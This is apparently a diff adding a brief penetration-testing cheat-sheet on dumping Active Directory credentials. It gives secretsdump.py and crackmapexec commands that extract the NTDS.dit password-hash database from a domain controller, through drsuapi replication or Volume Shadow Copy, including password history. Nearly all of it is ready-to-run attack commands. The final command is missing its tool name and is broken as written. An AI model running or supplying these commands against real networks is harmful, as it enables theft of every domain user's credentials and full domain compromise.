@@ -1,1 +1,16 @@
+NTDS.dit
+secretsdump.py -system system -ntds ntds.dit LOCAL
 
+# Dump the NTDS.dit from DC using methods from secretsdump.py
+
+# Uses drsuapi RPC interface create a handle, trigger replication
+# and combined with additional drsuapi calls to convert the resultant 
+# linked-lists into readable format
+
+crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
+
+# Uses the Volume Shadow copy Service
+crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
+
+# Dump the NTDS.dit password history
+smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
